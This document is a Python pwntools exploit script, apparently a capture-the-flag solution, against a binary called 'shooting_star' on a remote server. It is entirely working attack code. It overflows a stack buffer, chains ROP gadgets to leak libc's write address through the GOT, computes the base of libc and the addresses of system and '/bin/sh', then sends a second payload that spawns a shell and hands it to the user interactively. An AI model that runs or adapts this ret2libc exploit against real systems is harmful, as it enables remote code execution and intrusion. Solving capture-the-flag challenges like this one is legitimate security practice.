#!/usr/bin/env python3

from pwn import *
from pprint import pprint

#context.log_level = 'DEBUG'
binary = './shooting_star' #Binary name
elf = context.binary = ELF(binary,checksec=False) #Automatically get contex,arch,os etc..
#io = process(binary)
io = remote('206.189.121.131',31854)

#Binary enumeration
rsp_offset = 72
pop_rdi = 0x4012cb #pop rdi ; ret
pop_rsi_r15 = 0x4012c9 #pop rsi ; pop r15 ; ret

info("Instruction pointer offset: %#s",rsp_offset)
info("Pop rdi address: %#x",pop_rdi)
info("Pop rsi r15 address: %#x",pop_rsi_r15)

#Creating payload
leaking_address_payload = (rsp_offset * b'a' + p64(pop_rsi_r15) + p64(elf.got.write)
 + p64(0x0) + p64(elf.plt.write) + p64(elf.symbols.main)) 

#Triggering
io.sendlineafter('>','1')
io.sendlineafter('>>',leaking_address_payload)
io.recvuntil('May your wish come true!\n')

#Leaked libc write address
leaked_address = io.recv()
write_got_address = unpack(leaked_address[:6].ljust(8, b'\x00'))
log.success(f'Leaked libc write address: {hex(write_got_address)}')

#Calculating libc base address
libc_base_address = write_got_address - 0x110210 #Write address offset from libc base address
log.success(f'Leaked libc base address: {hex(libc_base_address)}')

#Calculating system and /bin/sh address
system_address = libc_base_address + 0x04f550
bin_sh_address = libc_base_address + 0x1b3e1a

#Creating the shell payload
shell = rsp_offset * b'a' + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address) 

#Triggering
io.sendline('1')
io.sendlineafter('>>',shell)
io.recvuntil('May your wish come true!\n')

#Shell
io.interactive()